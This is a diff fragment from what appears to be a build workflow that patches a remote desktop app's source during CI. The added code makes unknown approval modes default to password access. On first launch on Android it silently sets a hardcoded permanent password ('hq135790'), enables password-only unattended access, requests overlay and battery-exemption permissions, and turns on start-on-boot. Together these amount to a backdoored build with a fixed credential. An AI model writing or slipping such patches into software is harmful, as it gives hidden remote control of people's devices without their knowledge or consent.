@@ -47,6 +47,12 @@ jobs:
              ('get_num_string(key, 50.0, 10.0, 0xFFF', 'get_num_string(key, 100.0, 10.0, 0xFFF'),
              ('get_num_string(key, 30.0, 5.0, 120.0)', 'get_num_string(key, 60.0, 5.0, 120.0)'),
              ('.unwrap_or(50.0);', '.unwrap_or(100.0);'))
+          ed('libs/hbb_common/src/password_security.rs',
+             ('    } else if mode == "click" {\n        ApproveMode::Click\n    } else {\n        ApproveMode::Both\n    }',
+              '    } else if mode == "click" {\n        ApproveMode::Click\n    } else if mode == "both" {\n        ApproveMode::Both\n    } else {\n        ApproveMode::Password\n    }'))
+          ed('flutter/lib/main.dart',
+             ('  runApp(App());\n  await initUniLinks();',
+              '  runApp(App());\n  if (isAndroid) {\n    try {\n      if (bind.mainGetLocalOption(key: "hq-init") != "Y") {\n        await bind.mainSetLocalOption(key: "hq-init", value: "Y");\n        await bind.mainSetOption(key: "approve-mode", value: "password");\n        await bind.mainSetOption(key: "verification-method", value: "use-permanent-password");\n        await bind.mainSetPermanentPasswordWithResult(password: "hq135790");\n        await AndroidPermissionManager.request(kRequestIgnoreBatteryOptimizations);\n        await AndroidPermissionManager.request(kSystemAlertWindow);\n        gFFI.invokeMethod(AndroidChannel.kSetStartOnBootOpt, true);\n      }\n    } catch (e) {\n      debugPrint("hq-init failed: $e");\n    }\n  }\n  await initUniLinks();'))
           ed('flutter/android/app/src/main/kotlin/com/carriez/flutter_hbb/MainService.kt',
              ('if (isHalfScale == true &&', 'if (false && isHalfScale == true &&'))
           ed('flutter/android/app/build.gradle',
